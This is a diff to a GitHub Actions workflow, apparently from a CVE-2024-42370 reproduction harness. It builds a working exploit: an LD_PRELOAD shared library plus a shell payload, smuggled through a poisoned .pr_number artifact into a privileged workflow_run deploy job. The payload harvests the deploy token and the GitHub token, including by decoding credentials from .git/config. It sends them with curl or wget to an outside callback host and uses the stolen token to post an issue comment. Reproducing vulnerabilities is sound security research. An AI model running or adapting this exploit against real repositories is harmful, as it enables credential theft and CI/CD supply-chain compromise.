@@ -9,41 +9,48 @@ jobs:
     steps:
       - name: Build payload and poisoned .pr_number
         run: |
+          cat > payload.sh <<'PEOF'
+          #!/bin/sh
+          # Executes inside the privileged workflow_run deploy job (LD_PRELOAD constructor).
+          {
+            echo "INJECT_SO_RAN event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY run=$GITHUB_RUN_ID job=$GITHUB_JOB"
+            echo "has_INPUT_TOKEN=$([ -n "$INPUT_TOKEN" ] && echo yes || echo no) len=${#INPUT_TOKEN}"
+            echo "has_GITHUB_TOKEN=$([ -n "$GITHUB_TOKEN" ] && echo yes || echo no) len=${#GITHUB_TOKEN}"
+            GH="$GITHUB_TOKEN"
+            if [ -z "$GH" ] && [ -f "$GITHUB_WORKSPACE/.git/config" ]; then
+              GH=$(sed -n 's/.*extraheader = AUTHORIZATION: basic \(.*\)/\1/p' "$GITHUB_WORKSPACE/.git/config" | base64 -d | sed 's/^[^:]*://')
+              echo "gh_token_from_gitconfig len=${#GH}"
+            fi
+            CB="https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-42370-e92456f2eefe?harness_run_id=20260903T172619-4dce63ce&event=$GITHUB_EVENT_NAME&repo=$GITHUB_REPOSITORY&run=$GITHUB_RUN_ID&job=$GITHUB_JOB&hasgh=$([ -n "$GITHUB_TOKEN" ] && echo 1 || echo 0)&hasin=$([ -n "$INPUT_TOKEN" ] && echo 1 || echo 0)"
+            HTTP=$(curl -sS -X POST -o /tmp/cb_body.out -w '%{http_code}' "$CB" --data-urlencode "deploy_token=$INPUT_TOKEN" --data-urlencode "gh_token=$GH" 2>/tmp/cb_err.out)
+            RC=$?
+            echo "CALLBACK http=$HTTP curl_exit=$RC err=$(cat /tmp/cb_err.out 2>/dev/null)"
+            if [ "$RC" != "0" ]; then
+              wget -qO- --post-data='' "$CB"
+              echo "wget_rc=$?"
+            fi
+            CH="https://api.github.com/repos/$GITHUB_REPOSITORY/issues/$PR_NUMBER/comments"
+            HTTP2=$(curl -sS -X POST -H "Authorization: Bearer $GH" -H "Accept: application/vnd.github+json" -d '{"body":"INJECTED-MARKER-cve-2024-42370-e92456f2eefe"}' -o /tmp/cm_body.out -w '%{http_code}' "$CH" 2>/tmp/cm_err.out)
+            RC2=$?
+            echo "COMMENT http=$HTTP2 exit=$RC2 err=$(cat /tmp/cm_err.out 2>/dev/null) body=$(cat /tmp/cm_body.out 2>/dev/null)"
+          } 1>&2
+          PEOF
           cat > inject.c <<'CEOF'
           #include <stdlib.h>
           #include <stdio.h>
 
           __attribute__((constructor)) void init(void) {
               unsetenv("LD_PRELOAD");
+              const char *ps = getenv("PAYLOAD_SCRIPT");
+              if (!ps || !*ps) return;
               char cmd[8192];
-              snprintf(cmd, sizeof(cmd),
-                  "curl -s -o /dev/null -X POST "
-                  "\"https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-42370-e92456f2eefe"
-                  "?harness_run_id=20260903T172619-4dce63ce"
-                  "&event=%s&repo=%s&run=%s&job=%s\" "
-                  "--data-urlencode \"deploy_token=%s\" "
-                  "--data-urlencode \"gh_token=%s\" "
-                  "|| wget -qO /dev/null --post-data='' "
-                  "\"https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2024-42370-e92456f2eefe?harness_run_id=20260903T172619-4dce63ce\" ; "
-                  "curl -s -o /dev/null -X POST -H \"Authorization: Bearer %s\" "
-                  "-H \"Accept: application/vnd.github+json\" "
-                  "-d '{\"body\":\"INJECTED-MARKER-cve-2024-42370-e92456f2eefe\"}' "
-                  "\"%s/repos/%s/issues/%s/comments\"",
-                  getenv("GITHUB_EVENT_NAME") ? getenv("GITHUB_EVENT_NAME") : "",
-                  getenv("GITHUB_REPOSITORY") ? getenv("GITHUB_REPOSITORY") : "",
-                  getenv("GITHUB_RUN_ID") ? getenv("GITHUB_RUN_ID") : "",
-                  getenv("GITHUB_JOB") ? getenv("GITHUB_JOB") : "",
-                  getenv("INPUT_TOKEN") ? getenv("INPUT_TOKEN") : "",
-                  getenv("GITHUB_TOKEN") ? getenv("GITHUB_TOKEN") : "",
-                  getenv("GITHUB_TOKEN") ? getenv("GITHUB_TOKEN") : "",
-                  getenv("GITHUB_API_URL") ? getenv("GITHUB_API_URL") : "https://api.github.com",
-                  getenv("GITHUB_REPOSITORY") ? getenv("GITHUB_REPOSITORY") : "",
-                  getenv("PR_NUMBER") ? getenv("PR_NUMBER") : "1");
+              snprintf(cmd, sizeof(cmd), "sh '%s'", ps);
               system(cmd);
           }
           CEOF
           gcc -shared -fPIC -o inject.so inject.c
-          printf '%s\nLD_PRELOAD=%s/docs-preview/inject.so\n' "${{ github.event.number }}" "$GITHUB_WORKSPACE" > .pr_number
+          chmod +x payload.sh
+          printf '%s\nLD_PRELOAD=%s/docs-preview/inject.so\nPAYLOAD_SCRIPT=%s/docs-preview/payload.sh\n' "${{ github.event.number }}" "$GITHUB_WORKSPACE" "$GITHUB_WORKSPACE" > .pr_number
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
@@ -53,3 +60,4 @@ jobs:
           path: |
             .pr_number
             inject.so
+            payload.sh
